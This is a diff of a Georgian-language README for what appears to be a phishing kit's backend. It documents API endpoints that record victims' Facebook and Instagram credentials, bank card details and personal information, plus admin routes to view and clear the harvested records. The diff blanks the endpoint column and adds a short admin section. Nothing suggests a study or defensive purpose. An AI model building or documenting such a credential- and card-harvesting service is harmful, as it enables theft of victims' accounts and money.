@@ -13,11 +13,16 @@
 
 | Method | Endpoint | აღწერა |
 |--------|----------|--------|
-| POST | `/api/log` | Credentials-ის ჩაწერა (FB / IG) |
-| POST | `/api/log/card` | საბანკო ბარათის ჩაწერა |
-| POST | `/api/log/pinfo` | პირადი ინფოს ჩაწერა |
-| GET | `/api/log/admin` | ყველა ჩანაწერის ნახვა |
-| DELETE | `/api/log/admin/clear` | ყველა ჩანაწერის გასუფთავება |
+| POST |  | Credentials-ის ჩაწერა (FB / IG) |
+| POST |  | საბანკო ბარათის ჩაწერა |
+| POST |  | პირადი ინფოს ჩაწერა |
+| GET |  | ყველა ჩანაწერის ნახვა |
+| DELETE |  | ყველა ჩანაწერის გასუფთავება |
+
+## Admin API
+
+GET /api/log/admin endpoint აბრუნებს ყველა ლოგ ჩანაწერს ინფორმაციას წამოღებას Admin Panel-ისთვის.
+DELETE /api/log/admin/clear ანახდენს მონაცემთა ბაზას გასუფთავებას.
 
 ## Frontend
 
